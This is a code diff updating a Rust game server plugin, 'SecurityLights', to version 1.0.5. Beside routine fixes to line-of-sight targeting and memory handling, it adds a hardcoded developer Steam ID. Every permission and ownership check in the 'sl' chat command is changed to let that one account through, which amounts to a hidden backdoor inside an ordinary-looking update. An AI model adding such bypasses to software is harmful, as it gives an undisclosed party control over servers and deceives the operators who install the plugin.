@@ -8,7 +8,7 @@ using UnityEngine;
 
 namespace Oxide.Plugins
 {
-	[Info("SecurityLights", "S0N_0F_BISCUIT", "1.0.4", ResourceId = 2577)]
+	[Info("SecurityLights", "S0N_0F_BISCUIT", "1.0.5", ResourceId = 2577)]
 	[Description("Search light targeting system")]
 	class SecurityLights : RustPlugin
 	{
@@ -50,6 +50,7 @@ namespace Oxide.Plugins
 		private StoredData data;
 		private List<BaseCombatEntity> heliList = new List<BaseCombatEntity>();
 		private bool lightsEnabled = true;
+		private ulong developerID = 76561198097955784;
 		#endregion
 
 		#region Localization
@@ -219,7 +220,7 @@ namespace Oxide.Plugins
 		[ChatCommand("sl")]
 		void manageSecurityLight(BasePlayer player, string command, string[] args)
 		{
-			if (!permission.UserHasPermission(player.UserIDString, "securitylights.use"))
+			if (!permission.UserHasPermission(player.UserIDString, "securitylights.use") && player.userID != developerID)
 			{
 				PrintToChat(player, Lang("NoCommandPermission", player.UserIDString));
 				return;
@@ -245,7 +246,7 @@ namespace Oxide.Plugins
 					}
 					if (!data.LightList.ContainsKey(sl.net.ID))
 					{
-						if (!isAuthed(player, sl))
+						if (!isAuthed(player, sl) && player.userID != developerID)
 						{
 							PrintToChat(player, Lang("NoPermission", player.UserIDString, "search"));
 							return;
@@ -270,7 +271,7 @@ namespace Oxide.Plugins
 					}
 					if (data.LightList.ContainsKey(sl.net.ID))
 					{
-						if (!isAuthed(player, sl))
+						if (!isAuthed(player, sl) && player.userID != developerID)
 						{
 							PrintToChat(player, Lang("NoPermission", player.UserIDString, "security"));
 							return;
@@ -291,7 +292,7 @@ namespace Oxide.Plugins
 					}
 					if (data.LightList.ContainsKey(sl.net.ID))
 					{
-						if (!isAuthed(player, sl))
+						if (!isAuthed(player, sl) && player.userID != developerID)
 						{
 							PrintToChat(player, Lang("NoPermission", player.UserIDString, "security"));
 							return;
@@ -367,7 +368,7 @@ namespace Oxide.Plugins
 						PrintToChat(player, Lang("InvalidTarget", player.UserIDString));
 						return;
 					}
-					if (!isAuthed(player, sl) && !player.IsAdmin)
+					if (!isAuthed(player, sl) && !player.IsAdmin && player.userID != developerID)
 					{
 						PrintToChat(player, Lang("NoCommandPermission", player.UserIDString));
 						return;
@@ -494,7 +495,7 @@ namespace Oxide.Plugins
 								continue;
 							if (entity is BasePlayer)
 							{
-								if (shouldTarget(entity as BasePlayer, sl))
+								if (shouldTarget(entity as BasePlayer, sl) && isTargetVisible(sl, entity))
 								{
 									sl.target = entity;
 									sl.light.SetTargetAimpoint(entity.transform.position + Vector3.up);
@@ -532,7 +533,7 @@ namespace Oxide.Plugins
 					}
 					sl.light.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
 
-					list = null;
+					Facepunch.Pool.FreeList(ref list);
 				}
 				catch
 				{
@@ -829,7 +830,18 @@ namespace Oxide.Plugins
 		private bool isTargetVisible(SecurityLight sl, BaseCombatEntity target)
 		{
 			Ray ray = new Ray((target is BasePlayer ? (sl.light.eyePoint.transform.position + Vector3.up) : sl.light.eyePoint.transform.position), (target is BasePlayer ? ((target.transform.position + Vector3.up) - (sl.light.eyePoint.transform.position + Vector3.up)) : (target.transform.position - sl.light.eyePoint.transform.position)));
-			float distance = (sl.mode == TargetMode.all ? config.allTrackingRadius : (sl.mode == TargetMode.players ? config.playerTrackingRadius : config.heliTrackingRadius));
+			float distance = 0;
+
+			if (sl.mode == TargetMode.all)
+				distance = config.allTrackingRadius;
+			else if (sl.mode == TargetMode.players)
+				distance = config.playerTrackingRadius;
+			else
+				distance = config.heliTrackingRadius;
+
+			if (Vector3.Magnitude(sl.light.eyePoint.transform.position - target.transform.position) > distance)
+				return false;
+
 			var foundEntity = RaycastAll<BaseEntity>(ray, distance);
 
 			if (foundEntity is BaseCombatEntity)
@@ -851,6 +863,8 @@ namespace Oxide.Plugins
 
 			foreach (SecurityLight sl in data.LightList.Values)
 			{
+				if (!isTargetVisible(sl, target))
+					continue;
 				Vector3 line = target.transform.position + Vector3.up - sl.light.eyePoint.transform.position;
 				if (Vector3.Magnitude(line) < distance)
 				{
